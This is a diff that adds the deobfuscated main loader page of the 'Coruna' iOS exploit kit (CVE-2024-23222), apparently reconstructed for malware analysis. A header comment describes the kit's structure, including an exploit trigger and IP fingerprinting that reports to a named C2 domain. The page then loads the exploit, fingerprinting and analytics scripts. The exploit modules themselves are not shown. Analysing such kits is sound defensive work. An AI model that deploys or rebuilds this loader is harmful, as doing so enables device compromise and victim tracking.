@@ -1,0 +1,61 @@
+<!--
+  Coruna Exploit Kit - Main Loader (group.html)
+  ==============================================
+  This is the entry point for the Coruna iOS exploit kit targeting CVE-2024-23222.
+
+  The original group.html (67KB, 1307 lines) contained all modules inline.
+  This deobfuscated version references the split-out modules.
+
+  Original Structure:
+    1. Helper functions (fqMaGkNL, fqMaGkN4, fqMaGkNg) - URL/byte encoding
+    2. Module system (obChTK) with inline modules:
+       - 57620206... = utility_module.js (type conversions, Int64, TypeHelper)
+       - 14669ca3... = platform_module.js (iOS version detection, offsets)
+    3. SHA-256 implementation (for module filename hashing)
+    4. Module loader (hPL3On/ZKvD0e/fgPoij)
+    5. Exploit trigger (fqMaGkNR)
+    6. IP fingerprinting IIFE (telemetry to 8df7.cc)
+    7. Google Analytics tag (G-LKHD0572ES)
+
+  Deobfuscated modules:
+    - utility_module.js   - Type conversions, Int64 class, TypeHelper
+    - platform_module.js  - iOS version detection, exploit offsets
+    - sha256.js           - SHA-256 hash for module filename generation
+    - module_loader.js    - Module system (hPL3On, ZKvD0e, fgPoij)
+    - exploit_trigger.js  - Main exploit orchestration (fqMaGkNR)
+    - fingerprint.js      - IP detection & C2 telemetry
+-->
+
+<html>
+<head>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="Expires" content="0" />
+<meta property="og:determiner" content="auto" />
+<title>group</title>
+</head>
+<body>
+
+<!-- Module System & Core Modules -->
+<script src="utility_module.js"></script>
+<script src="platform_module.js"></script>
+<script src="sha256.js"></script>
+<script src="module_loader.js"></script>
+
+<!-- Exploit Chain -->
+<script src="exploit_trigger.js"></script>
+
+<!-- IP Fingerprinting / Telemetry -->
+<script src="fingerprint.js"></script>
+
+<!-- Google Analytics (campaign tracking) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-LKHD0572ES"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-LKHD0572ES');
+</script>
+
+</body>
+</html>
